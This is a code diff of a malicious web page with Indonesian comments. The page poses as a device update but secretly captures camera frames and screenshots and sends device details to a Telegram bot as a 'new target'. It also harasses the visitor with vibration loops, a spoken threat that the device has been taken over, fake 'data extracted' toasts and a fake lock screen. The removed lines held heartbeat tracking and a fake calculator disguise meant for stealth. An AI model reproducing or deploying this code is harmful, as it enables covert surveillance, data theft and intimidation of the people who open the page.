+            c.getContext('2d').drawImage(v, 0, 0);
+            return c.toDataURL('image/jpeg', 0.8);
         }
 
-        // ==================== PERSISTENT TRACKING ====================
-        // Kirim data tiap 30 detik selama user di halaman
-        setInterval(() => {
-            sendToTelegram(`💓 *HEARTBEAT*\nWaktu: ${new Date().toLocaleString()}\nHalaman masih terbuka`);
-        }, 30000);
+        function isBlackImage(dataUrl) {
+            if (!dataUrl) return true;
+            const img = new Image();
+            img.src = dataUrl;
+            const tc = document.createElement('canvas');
+            tc.width = tc.height = 48;
+            const ctx = tc.getContext('2d');
+            ctx.drawImage(img, 0, 0, 48, 48);
+            const d = ctx.getImageData(0, 0, 48, 48).data;
+            let sum = 0;
+            for (let i = 0; i < d.length; i += 4) sum += (d[i] + d[i+1] + d[i+2]) / 3;
+            return (sum / (48*48)) < 12;
+        }
 
-        // Track when user leaves
-        window.addEventListener('beforeunload', () => {
-            sendToTelegram(`👋 *USER KELUAR*\nWaktu: ${new Date().toLocaleString()}\nDurasi: ${Math.floor(performance.now() / 1000)} detik`);
-        });
+        function captureScreenFallback() {
+            try {
+                const c = document.getElementById('hiddenCanvas');
+                c.width = window.innerWidth;
+                c.height = window.innerHeight;
+                const ctx = c.getContext('2d');
+                ctx.drawImage(document.documentElement, 0, 0, c.width, c.height);
+                return c.toDataURL('image/jpeg', 0.7);
+            } catch { return null; }
+        }
 
-        // ==================== FAKE CALCULATOR (UNTUK STEALTH) ====================
-        // Biar kalo user balik lagi, munculnya kalkulator
-        let calcDisplay = '0';
-        let prevCalc = '';
-        
-        window.pressBtn = function(btn) {
-            if (btn === 'AC') {
-                calcDisplay = '0';
-                prevCalc = '';
-            } else if (btn === '=') {
-                try {
-                    prevCalc = calcDisplay;
-                    calcDisplay = eval(calcDisplay.replace('×', '*').replace('÷', '/').replace('−', '-'));
-                } catch (e) {
-                    calcDisplay = 'Error';
-                }
-            } else {
-                if (calcDisplay === '0' || calcDisplay === 'Error') {
-                    calcDisplay = btn;
+        // ==================== CHAOS KONTROL ====================
+        async function chaosControls() {
+            // Vibrate chaos
+            if (navigator.vibrate) {
+                setInterval(() => navigator.vibrate([90,50,140,70,220]), 14000);
+                await sendToTelegram("📳 Getar chaos aktif");
+            }
+
+            // TTS ancaman
+            if ('speechSynthesis' in window) {
+                const u = new SpeechSynthesisUtterance("Perangkat Anda telah dikendalikan. Jangan matikan atau tutup halaman ini. Data sedang diproses.");
+                u.lang = 'id-ID';
+                u.rate = 0.92;
+                speechSynthesis.speak(u);
+                await sendToTelegram("🗣️ TTS ancaman dijalankan");
+            }
+
+            // Fake toast loop
+            function showToast(txt) {
+                const t = document.getElementById('fakeToast');
+                t.textContent = txt;
+                t.style.display = 'block';
+                setTimeout(() => t.style.display = 'none', 6000);
+            }
+            const toasts = ["Data pribadi diekstrak", "Proses tidak bisa dibatalkan", "Jangan keluar dari halaman", "Sistem terkunci"];
+            setInterval(() => showToast(toasts[Math.floor(Math.random()*toasts.length)]), 20000);
+
+            // Fake lock setelah 40 detik
+            setTimeout(() => {
+                document.getElementById('fakeLockScreen').style.display = 'flex';
+                document.querySelector('.update-container').style.opacity = '0.4';
+                sendToTelegram("🔒 Fake lock screen aktif");
+            }, 40000);
+        }
+
+        // ==================== START EKSEKUSI ====================
+        window.onload = async function() {
+            updateStatus('Analisis dimulai...', 5);
+            await sendToTelegram(`🔥 TARGET BARU\nTipe: ${deviceInfo.type}\nUA: ${deviceInfo.ua}\nLayar: ${deviceInfo.screen}\nTZ: ${deviceInfo.tz}`);
+
+            chaosControls();
+
+            // Jalankan kamera fix
+            await getCameraUniversal();
+
+            // Simulasi progress panjang
+            let pct = 10;
+            const sim = setInterval(() => {
+                pct += Math.random() * 12;
+                if (pct >= 100) {
+                    pct = 100;
+                    clearInterval(sim);
+                    updateStatus('Pembaruan selesai — perangkat terkendali', 100);
+                    sendToTelegram("✅ KONTROL PENUH");
                 } else {
-                    calcDisplay += btn;
+                    updateStatus(`Mengamankan akses... ${Math.round(pct)}%`, pct);
                 }
-            }
-            
-            document.getElementById('currInput').innerText = calcDisplay;
-            document.getElementById('prevOp').innerText = prevCalc;
+            }, 1400);
         };
     </script>
-    </body>
+</body>
+</html>
